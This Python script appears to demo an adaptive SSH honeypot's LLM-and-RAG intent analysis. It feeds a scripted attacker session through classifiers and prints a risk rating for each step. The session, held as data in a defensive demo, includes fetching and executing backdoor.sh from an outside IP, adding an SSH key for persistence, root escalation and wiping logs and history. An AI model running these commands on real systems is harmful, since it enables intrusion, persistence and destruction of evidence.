from __future__ import annotations

import sys
import os
import time
import importlib.util
import builtins

# ---------------------------------------------------------
# PATH SETUP
# ---------------------------------------------------------
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.abspath(os.path.join(CURRENT_DIR, "../../.."))

# ---------------------------------------------------------
# LOAD SimpleRAGIndex SAFELY (for pickle compatibility)
# ---------------------------------------------------------
build_index_path = os.path.join(
    PROJECT_ROOT, "src/cowrie/adaptive/rag/build_index.py"
)
spec = importlib.util.spec_from_file_location("build_index", build_index_path)
build_index_module = importlib.util.module_from_spec(spec)
sys.modules["build_index"] = build_index_module
spec.loader.exec_module(build_index_module)

SimpleRAGIndex = build_index_module.SimpleRAGIndex

# Trick pickle if index was saved under __main__
if not hasattr(builtins, "SimpleRAGIndex"):
    setattr(builtins, "SimpleRAGIndex", SimpleRAGIndex)

# ---------------------------------------------------------
# LOAD SESSION COLLECTOR
# ---------------------------------------------------------
collector_path = os.path.join(
    PROJECT_ROOT,
    "src/cowrie/adaptive/telemetry/session_collector.py"
)
spec = importlib.util.spec_from_file_location("session_collector", collector_path)
collector_module = importlib.util.module_from_spec(spec)
spec.loader.exec_module(collector_module)
SessionCollector = collector_module.SessionCollector

# ---------------------------------------------------------
# LOAD POLICY ENGINE
# ---------------------------------------------------------
policy_path = os.path.join(
    PROJECT_ROOT,
    "src/cowrie/adaptive/policy/policy_engine.py"
)
spec = importlib.util.spec_from_file_location("policy_engine", policy_path)
policy_module = importlib.util.module_from_spec(spec)
spec.loader.exec_module(policy_module)
PolicyEngine = policy_module.PolicyEngine

# ---------------------------------------------------------
# LOAD INTENT REASONER (LLM + RAG)
# ---------------------------------------------------------
sys.modules["cowrie.adaptive.rag.build_index"] = build_index_module

reasoner_path = os.path.join(
    PROJECT_ROOT,
    "src/cowrie/adaptive/llm/intent_reasoner.py"
)
spec = importlib.util.spec_from_file_location("intent_reasoner", reasoner_path)
intent_reasoner_module = importlib.util.module_from_spec(spec)
spec.loader.exec_module(intent_reasoner_module)
IntentReasoner = intent_reasoner_module.IntentReasoner


# ---------------------------------------------------------
# UTIL: TYPEWRITER EFFECT
# ---------------------------------------------------------
def type_writer(text: str, speed: float = 0.02):
    for ch in text:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(speed)
    print()


# ---------------------------------------------------------
# MAIN DEMO
# ---------------------------------------------------------
def main():
    print("\n" + "=" * 60)
    print("  ADAPTIVE SSH HONEYPOT :: INTELLIGENCE LAYER DEMO")
    print("=" * 60 + "\n")

    # Initialize components
    print("[*] Initializing RAG Knowledge Base...", end=" ")
    reasoner = IntentReasoner()
    print("DONE.")

    print("[*] Initializing Session Collector...", end=" ")
    collector = SessionCollector(session_id="session-demo-001")
    print("DONE.")

    print("[*] Initializing Policy Engine...", end=" ")
    policy_engine = PolicyEngine()
    print("DONE.")

    print("\n" + "-" * 60)
    print("SCENARIO START: Unknown User connects via SSH")
    print("-" * 60)

    # ---------------------------------------------------------
    # COMMAND SCENARIO (FULL ATTACK LIFECYCLE)
    # ---------------------------------------------------------
    steps = [
        # 🟢 LOW RISK – Reconnaissance
        ("whoami", "Identify current user"),
        ("id", "Check UID and groups"),
        ("pwd", "Check working directory"),
        ("uname -a", "Kernel and OS fingerprinting"),
        ("hostname", "Identify system hostname"),
        ("ls", "List directory contents"),
        ("ls -la", "Detailed file enumeration"),

        # 🟡 MEDIUM RISK – Discovery & Credentials
        ("cat /etc/passwd", "Enumerate local users"),
        ("getent passwd", "User enumeration via NSS"),
        ("env", "Inspect environment variables"),
        ("history", "Inspect command history"),
        ("sudo -l", "Probe sudo privileges"),

        # 🔴 HIGH RISK – Payload Delivery & Execution
        ("wget http://192.168.1.50/backdoor.sh", "Download external payload"),
        ("curl http://192.168.1.50/loader.sh", "Alternate payload fetch"),
        ("chmod +x backdoor.sh", "Make payload executable"),
        ("sh backdoor.sh", "Execute payload"),
        ("./backdoor.sh", "Direct payload execution"),

        # 🔴🔴 CRITICAL – Privilege Escalation & Persistence
        ("sudo su", "Attempt root escalation"),
        ("su root", "Switch to root user"),
        (
            "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
            "Add persistent SSH backdoor"
        ),
        ("crontab -l", "List cron jobs"),
        ("crontab -e", "Create persistence via cron"),

        # ⚫ VERY HIGH – Defense Evasion & Destruction
        ("rm -rf /var/log/cowrie", "Attempt to delete honeypot logs"),
        ("rm -rf /var/log/*", "Wipe system logs"),
        ("history -c", "Clear command history"),
        ("unset HISTFILE", "Disable shell history tracking"),
    ]

    # ---------------------------------------------------------
    # EXECUTE SCENARIO
    # ---------------------------------------------------------
    for cmd, description in steps:
        type_writer(f"\n[ATTACKER] > {cmd}")
        time.sleep(0.4)

        # Update telemetry
        if "wget" in cmd or "curl" in cmd:
            collector.add_url(cmd.split()[-1])

        collector.add_command(cmd)
        summary = collector.get_text_summary()

        print("[SYSTEM] Analyzing behavior via LLM & RAG...")
        analysis = reasoner.analyze_session(summary)

        intent = analysis.get("intent", "Unknown")
        risk = analysis.get("risk", "LOW")
        policy = analysis.get("policy", "Monitoring")

        print(f"   [BRAIN] Intent Identified: {intent}")
        print(f"   [BRAIN] Risk Assessment:   {risk}")
        print(f"   [BRAIN] Recommended Policy: {policy}")

        policy_engine.update_policy("session-demo-001", analysis)

        if risk.lower() in ["high", "critical", "very high"]:
            if risk.lower() == "very high":
                print("   [!!!] ALERT: DESTRUCTIVE ACTION DETECTED. CONTAINMENT INITIATED.")
            else:
                print(f"   [!!!] ALERT: {risk.upper()} RISK DETECTED. AGGRESSIVE DECEPTION ACTIVE.")

        time.sleep(0.8)

    print("\n" + "=" * 60)
    print("DEMO COMPLETE")
    print("=" * 60 + "\n")


# ---------------------------------------------------------
if __name__ == "__main__":
    main()

